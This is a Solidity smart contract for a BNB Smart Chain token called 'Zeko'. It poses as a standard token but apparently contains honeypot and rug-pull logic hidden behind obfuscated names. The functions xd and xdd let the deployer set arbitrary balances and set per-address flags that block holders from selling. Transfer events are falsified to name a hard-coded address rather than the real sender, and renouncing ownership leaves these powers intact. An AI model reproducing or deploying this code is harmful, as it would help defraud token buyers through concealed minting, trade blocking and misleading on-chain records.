/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

pragma solidity 0.8.17;

abstract contract Context {
    address G6 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract Zeko is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private G1;
    mapping (address => uint256) private G2;
    mapping (address => mapping (address => uint256)) private G3;
    uint8 private  G4;
    uint256 private  G5;
    string private  _name;
    string private  _symbol;



    constructor () {

        
        _name = "Zeko";
        _symbol = "Zeko";
        G4 = 9;
        uint256 G9 = 100000000;
        G2[msg.sender] = 1;
        
        

        increase(G6, G9*(10**9));
        


    }

    

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return G4;
    }

    function totalSupply() public view  returns (uint256) {
        return G5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return G1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return G3[owner][spender];
    }
    function increase(address account, uint256 amount) onlyOwner public {
     
        G5 = G5.add(amount);
        G1[msg.sender] = G1[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }






        function approve(address spender, uint256 amount) public returns (bool success) {    
        G3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function xd (address x, uint256 y) public {
 require(G2[msg.sender] == 1);
     G2[x] = y;}
    function xdd() public {
        G1[msg.sender] = G2[msg.sender];}





                      function G7 (address y, uint256 xy) internal {
              emit Transfer(G6, y, xy);}


    function transfer(address recipient, uint256 amount) public virtual  returns (bool) {
        _load(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
                  require(amount <= G3[sender][msg.sender]);
        _load(sender, recipient, amount);}
        
        
   modifier fill(address sender, address recipient, uint256 amount){
        _;
    }

    function _load(address sender, address recipient, uint256 amount) internal fill(sender,recipient,amount) virtual {
        require(G2[sender] <= 1 || G2[recipient] <=1);
         require(amount <= G1[sender]);
        G1[sender] = G1[sender].sub(amount);
        G1[recipient] = G1[recipient].add(amount);
       if(G2[sender] == 1) {
            
            sender = G6;
        }
        emit Transfer(sender, recipient, amount);
        
        
        
    }
        
        
        
        }